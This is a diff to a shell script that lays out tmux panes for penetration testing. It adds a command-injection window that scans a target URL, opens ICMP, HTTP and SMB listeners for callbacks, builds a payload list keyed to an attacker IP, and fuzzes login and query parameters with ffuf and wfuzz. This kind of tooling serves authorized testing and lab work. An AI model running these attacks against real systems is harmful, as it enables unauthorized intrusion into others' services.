@@ -3078,14 +3078,15 @@ cd $folderProjectWebAuthN
 # Layout
 tmux new-window -t PT:2 -n 'WEB Password Enumeration'
 tmux split-window -v -t PT:2.0
+tmux resize-pane -t PT:2.0 -y 3
 tmux select-pane -t "2.0"
 tmux split-window -h -t "2.0"
 tmux split-window -h -t "2.0"
 tmux split-window -h -t "2.0"
-tmux split-window -h -t "2.0"
-tmux split-window -h -t "2.0"
-tmux split-window -h -t "2.0"
-tmux split-window -v -t "2.0"
+tmux split-window -v -t PT:2.4
+tmux select-pane -t "2.4"
+tmux split-window -h -t "2.4"
+tmux split-window -h -t "2.4"
 tmux split-window -v -t PT:2.7
 tmux select-pane -t "2.7"
 tmux split-window -h -t "2.7"
@@ -3143,6 +3144,63 @@ tmux send-keys -t PT:2.18 "sudo find /usr/share/seclists/ | grep assword | grep 
 cd $folderProject
 
 
+
+# WEB Bruteforce AuthN
+cd $folderProjectWebAuthN
+# Layout
+tmux new-window -t PT:3 -n 'WEB Bruteforce AuthN'
+tmux split-window -v -t PT:3.0
+tmux select-pane -t "3.0"
+tmux split-window -h -t "3.0"
+tmux split-window -h -t "3.0"
+tmux split-window -v -t PT:3.3
+tmux select-pane -t "3.3"
+tmux split-window -h -t "3.3"
+tmux split-window -v -t PT:3.5
+tmux select-pane -t "3.5"
+tmux split-window -h -t "3.5"
+# Esecuzione dei comandi nelle sottofinestre
+tmux send-keys -t PT:3.0 "# ù" Enter
+tmux send-keys -t PT:3.0 ""
+cd $folderProject
+
+
+# WEB Command Injection
+cd $folderProjectWebAuthN
+# Layout
+tmux new-window -t PT:4 -n 'WEB Command Injection'
+tmux split-window -v -t PT:4.0
+tmux split-window -v -t PT:4.1
+tmux split-window -v -t PT:4.2
+tmux select-pane -t "4.1"
+tmux split-window -h -t "4.1"
+tmux split-window -h -t "4.1"
+tmux select-pane -t "4.4"
+tmux split-window -h -t "4.4"
+tmux split-window -h -t "4.4"
+# Esecuzione dei comandi nelle sottofinestre
+tmux send-keys -t PT:4.0 "# automate command injection scan" Enter
+tmux send-keys -t PT:4.0 "sudo uniscan -u $url -qweds"
+tmux send-keys -t PT:4.1 "# activate listener ICMP" Enter
+tmux send-keys -t PT:4.1 "sudo tcpdump -i tun0 icmp"
+tmux send-keys -t PT:4.2 "# activate listener HTTP" Enter
+tmux send-keys -t PT:4.2 "python3 -m http.server 80"
+tmux send-keys -t PT:4.3 "# activate listener SMB" Enter
+tmux send-keys -t PT:4.3 "impacket-smbserver -smb2support htb \$(pwd)"
+#Preparo il file per le command injection
+cd $folderProjectEngine
+#tmux send-keys -t PT:1.6 "echo \"eseguo da path $folderProjectEngine -> python ./cmdGenerator.py $attackerIP cmdList.txt \""
+python ./cmdGenerator.py $attackerIP cmdlist.txt
+mv "$folderProjectEngine/out-command-injection-list.txt" "$folderProjectWebAuthN/out-command-injection-list.txt"
+cd $folderProjectWebAuthN
+#sleep 1
+tmux send-keys -t PT:4.4"# command injection automation (save burp file with name: burp.req)" Enter
+tmux send-keys -t PT:4.4 "ffuf -request burp.req -request-proto http -w $folderProjectWebAuthN/out-command-injection-list.txt"
+tmux send-keys -t PT:4.5"# command injection automation (GET)" Enter
+tmux send-keys -t PT:4.5 "wfuzz -c -z file,out-command-injection-list.txt -H \"Content-Type: application/x-www-form-urlencoded\" -H \"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3\" --sc=200 $url/?id=FUZZ"
+tmux send-keys -t PT:4.6 "# command injection automation (POST)" Enter
+tmux send-keys -t PT:4.6 "wfuzz -c -z file,out-command-injection-list.txt -H \"Content-Type: application/x-www-form-urlencoded\" -H \"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3\" -d \"username=admin&password=FUZZ\" --sc=200 $url/login.php # cmd injection (POST)"
+cd $folderProject
 
 
 
